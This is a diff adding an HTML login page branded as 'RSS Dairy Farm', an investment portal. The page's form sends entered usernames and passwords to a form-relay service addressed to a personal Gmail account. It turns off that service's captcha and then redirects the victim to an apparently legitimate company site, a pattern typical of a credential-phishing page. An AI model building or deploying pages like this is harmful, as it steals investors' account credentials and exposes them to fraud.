@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>RSS Dairy Farm Login</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+    body {
+      background: linear-gradient(to right, #f0f4f7, #f8e6f0);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      display: flex;
+      background: #fff;
+      border-radius: 16px;
+      overflow: hidden;
+      box-shadow: 0 6px 18px rgba(0,0,0,0.12);
+      max-width: 900px;
+      width: 95%;
+    }
+    .left {
+      flex: 1;
+      background: url('https://i.ibb.co/SNcQkb3/farm.jpg') no-repeat center center/cover;
+    }
+    .right {
+      flex: 1;
+      padding: 40px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+    .right img {
+      width: 70px;
+      margin-bottom: 15px;
+    }
+    .right h2 {
+      font-size: 22px;
+      font-weight: 700;
+      margin-bottom: 10px;
+      color: #222;
+    }
+    .right p {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 25px;
+      line-height: 1.5;
+    }
+    label {
+      font-size: 14px;
+      font-weight: 600;
+      display: block;
+      margin-bottom: 6px;
+      color: #333;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-bottom: 2px solid #ddd;
+      margin-bottom: 20px;
+      outline: none;
+      font-size: 14px;
+      transition: 0.3s;
+    }
+    input:focus {
+      border-color: #28a745;
+    }
+    .forgot {
+      text-align: right;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+    .forgot a {
+      text-decoration: none;
+      color: #007f3d;
+      font-weight: 600;
+    }
+    .login-btn {
+      width: 100%;
+      padding: 14px;
+      background: linear-gradient(to right, #007f3d, #28a745);
+      color: white;
+      font-size: 15px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    .signup {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 14px;
+      color: #333;
+    }
+    .signup a {
+      text-decoration: none;
+      color: #28a745;
+      font-weight: bold;
+    }
+    @media(max-width:768px) {
+      .container {
+        flex-direction: column;
+      }
+      .left {
+        height: 180px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Left image side -->
+    <div class="left"></div>
+    
+    <!-- Right login form -->
+    <div class="right">
+      <img src="https://i.ibb.co/fVH957Vw/3o-XWHrbd-SZnx-By60-Lact.jpg" alt="RSS Logo">
+      <h2>Welcome Back to RSS Dairy Farm</h2>
+      <p>Log in to manage your investments, track your earnings, and grow your income with real farming.</p>
+      
+      <form action="formsubmit.co/snakepark26@gmail.com" method="POST">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="https://office.rssholdingslimited.com/#">
+      
+      <form>
+       
+        <label>Email Or Username</label>
+        <input type="text" name="email_or_username" placeholder="Enter Email or Username">
+        
+        <label>Password</label>
+        <input type="password" name="password" placeholder="Enter Password">
+        
+        <div class="forgot">
+          <a href="#">Forget Password</a>
+        </div>
+        
+        <button type="submit" class="login-btn">ACCOUNT LOGIN</button>
+        
+        <div class="signup">
+          Don't have an account? <a href="#">Signup for free</a>
+        </div>
+      </form>
+    </div>
+  </div>
+</body>
+</html>
